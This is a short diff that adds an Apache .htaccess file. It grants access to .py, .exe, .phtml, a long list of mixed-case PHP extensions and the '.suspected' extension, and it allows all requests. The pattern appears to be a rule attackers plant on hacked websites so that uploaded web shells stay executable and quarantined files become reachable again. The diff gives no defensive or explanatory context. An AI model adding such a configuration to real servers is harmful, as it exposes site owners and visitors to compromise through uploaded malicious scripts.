@@ -1,0 +1,14 @@
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+<IfModule !mod_authz_core.c>
+    Order Deny,Allow
+    Allow from all
+</IfModule>
+
+<IfModule mod_authz_core.c>
+    Require all granted
+</IfModule>
+Options -Indexes
